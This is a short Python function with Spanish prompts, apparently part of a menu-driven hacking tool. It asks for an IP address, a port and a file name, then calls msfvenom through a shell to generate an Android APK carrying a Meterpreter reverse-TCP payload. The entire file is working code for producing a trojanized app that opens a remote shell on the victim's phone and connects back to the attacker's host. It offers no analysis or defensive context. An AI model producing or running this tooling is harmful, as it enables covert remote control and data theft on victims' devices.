# Desarrollado Por NesAnTime, Todos los derechos Reservados


def ToolCreatorAndroid():
    clear()
    Barra(desc="Iniciando la Ejecucion: ")
    print("\nEjecucion del Payload Completada...")
    print("A Continuacion, Se Completara La Creacion De La Apk\n")
    ip = input("Proporcione Su Direccion IP: \n")
    lop = input("Su direccion IP:" + str(ip) +" ¿Es Correcta? (y/n): ")
    while lop == "n":
        ip = input("Proporcione Su Direccion IP Nuevamente: \n")
        lop = input("Su direccion IP:" + str(ip) +" ¿Es Correcta? (y/n): ")
    clear()
    print(f"Direccion IP ({ip}) Establecida Correctamente...\n")

    port = int(input("Proporcione un Puerto de Escucha: "))
    print(f"El Puerto de Escucha (" + str(port) + ") Se ha Establecido Correctamente..\n")
    clear()

    print("** Terminando La Creacion del APK ** ")
    name = input("Ingrese el Nombre del Archivo .Apk: ")
    print(f"Se Ha establecido El Nombre del Archivo ({name}.apk) Correctamente! ")
    clear()
    Barra(desc="Creando Archivo .Apk")

    try:
        comando = "msfvenom -p android/meterpreter/reverse_tcp LHOST="+ ip + " LPORT="+ str(port) + " -o " + name +".apk"
        resultado = subprocess.run(comando, shell=True, check=True, capture_output=True, text=True)
        print("Se Ha Creado El Archivo .APK Correctamente\n")
        print("*** Informacion Y Detalles ***")
        print(f"Name:{name}.apk")
        print(f"IP: {ip}")
        print(f"PORT: {port}")
        input("\nPresione Enter Para Finalizar... ")
        Main()

        return True
    except subprocess.CalledProcessError as e:
        print(f"Error al Crear El Archivo :( {e}")
        input("\nPresione Enter Para Finalizar... ")
        Main()
        return False
    